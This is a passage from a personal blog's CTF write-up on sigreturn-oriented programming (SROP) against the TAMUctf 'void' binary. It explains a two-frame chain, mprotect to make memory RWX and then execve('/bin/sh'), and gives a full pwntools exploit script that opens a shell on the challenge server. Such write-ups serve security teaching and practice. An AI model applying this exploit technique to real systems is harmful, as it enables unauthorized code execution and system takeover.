class="code"><pre><span class="line">Before sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 15, rsp = 0xffff1000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">fake signal frame &lt;- rsp = 0xffff1000</span><br><span class="line">rsp = some value(eg. 0xffff4000)</span><br><span class="line">rax = 10</span><br><span class="line">rip = syscall address</span><br><span class="line">....</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">After sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 10, rsp = 0xffff4000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip # this syscall the do mprotect</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">ret  &lt;- rip </span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br></pre></td></tr></table></figure>
+
+<p>Its okay if we end after one sigreturn. But in this case, we need to do two sigreturn, so it is important to return back to <code>main</code>. Therefore, we need find some where in the memory that contains an pointer to <code>main</code>, so that when <code>ret</code> is called, it will go back to <code>main</code> and we can do another SROP there.</p>
+<p>Luckily, in <code>0x004020b8</code>, there is pointer that point to <code>main</code>. So we can happily make whole <code>0x00402000-0x00403000</code> page writable and use this address as our new rsp.</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
+<li>write signal frame to the stack with rax=10 (mprotect), rdi = 0x00402000, rsi = 0x1000, rdx = 7 (rwx), rsp = 0x004020b8, rip = syscall addr. Then return to main</li>
+<li>write 15 bytes to trigger sigreturn</li>
+<li>syscall <code>mprotect(0x00402000,0x1000,7)</code></li>
+<li>return to main, write signal frame for calling execve. Then return to main</li>
+<li>write 15 bytes to trigger sigreturn</li>
+<li>syscall <code>execve(&#39;/bin/sh&#39;,0,0)</code> to get a shell</li>
+</ol>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;void&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    No RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># rax syscall x64</span><br><span class="line"># 0   read</span><br><span class="line"># 1   write</span><br><span class="line"># 15  rt_sigreturn</span><br><span class="line"># 59  execve</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">syscall_ret_addr = 0x00401018</span><br><span class="line">fake_rwx_stack_addr = 0x004020b8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_frame = SigreturnFrame()</span><br><span class="line">mprotect_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">mprotect_frame.rsp = fake_rwx_stack_addr</span><br><span class="line">mprotect_frame.rax = constants.SYS_mprotect</span><br><span class="line">mprotect_frame.rdi = 0x00402000</span><br><span class="line">mprotect_frame.rsi = 0x1000</span><br><span class="line">mprotect_frame.rdx = 7 # rwx</span><br><span class="line"></span><br><span class="line">do_mprotect = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(mprotect_frame)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">input(&quot;send mprotect payload&quot;)</span><br><span class="line">io.send(do_mprotect) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve_bin_sh_frame = SigreturnFrame()</span><br><span class="line">execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">execve_bin_sh_frame.rsp = fake_rwx_stack_addr # </span><br><span class="line">execve_bin_sh_frame.rax = constants.SYS_execve</span><br><span class="line">execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat(&#123;0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]&#125;))</span><br><span class="line">execve_bin_sh_frame.rsi = 0</span><br><span class="line">execve_bin_sh_frame.rdx = 0</span><br><span class="line"></span><br><span class="line">do_execve_bin_sh = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(execve_bin_sh_frame),</span><br><span class="line">        b&quot;/bin/sh\x00&quot;,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input(&quot;send execve bin/sh payload&quot;)</span><br><span class="line">io.send(do_execve_bin_sh) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201512/452080.html">https://www.2cto.com/article/201512/452080.html</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/28/ctfwriteup/linectf2022/line-ctf-2022-web-gotm-ssti/" rel="prev" title="[web] gotm (golang ssti) [line ctf 2022]">
+      <i class="fa fa-chevron-left"></i> [web] gotm (golang ssti) [line ctf 2022]
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Theory"><span class="nav-number">2.</span> <span class="nav-text">Theory</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Before"><span class="nav-number">2.1.</span> <span class="nav-text">Before</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduce-to-syscall-rt-sigreturn"><span class="nav-number">2.2.</span> <span class="nav-text">Introduce to syscall - rt_sigreturn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-trigger-sigreturn-in-the-first-place"><span class="nav-number">2.3.</span> <span class="nav-text">How to trigger sigreturn in the first place.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getting-a-shell-using-SROP"><span class="nav-number">2.4.</span> <span class="nav-text">Getting a shell using SROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Example-Void"><span class="nav-number">3.</span> <span class="nav-text">Example - Void</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">3.1.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">3.2.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+        
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LXG-Shadow" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LXG-Shadow" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
